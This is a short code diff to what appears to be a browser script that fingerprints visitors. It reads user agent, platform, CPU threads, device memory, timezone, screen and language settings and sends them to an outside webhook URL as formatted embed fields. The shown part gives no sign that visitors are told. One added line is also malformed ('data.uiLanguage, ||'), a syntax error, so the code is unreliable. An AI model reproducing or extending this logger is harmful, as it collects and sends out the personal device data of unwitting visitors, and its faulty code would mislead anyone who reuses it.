@@ -88,6 +88,15 @@
         doNotTrack: navigator.doNotTrack
       };
 
+      const data = {
+        userAgent: navigator.userAgent,
+        platform: navigator.platform,
+        hardwareConcurrency: navigator.hardwareConcurrency,
+        deviceMemory: navigator.deviceMemory,
+        uiLanguage: uiLanguage,
+        preferredLanguages: preferredLanguages,
+      };
+      
       const screenInfo = {
         width: screen.width,
         height: screen.height,
@@ -167,7 +176,9 @@ await fetch(WEBHOOK_URL, {
         { name: "Local Time", value: `${basic.localTime || "Unknown"}`, inline: false },
         { name: "Timezone", value: `${basic.timezone || "Unknown"}`, inline: true },
         { name: "UTC Offset (Minutes)", value: `${basic.offsetMinutes || "Unknown"}`, inline: true },
-      
+        { name: "UI Language", value: `${data.uiLanguage, || "Unknown"}`, inline: true },
+        { name: "Preferred Languages", value: `${data.preferredLanguages.join(", ") || "Unknown"}`, inline: true },
+        
         // —— SYSTEM ——
         { name: "Platform", value: `${basic.platform || "Unknown"}`, inline: true },
         { name: "CPU Threads", value: `${basic.hardwareConcurrency || "Unknown"}`, inline: true },
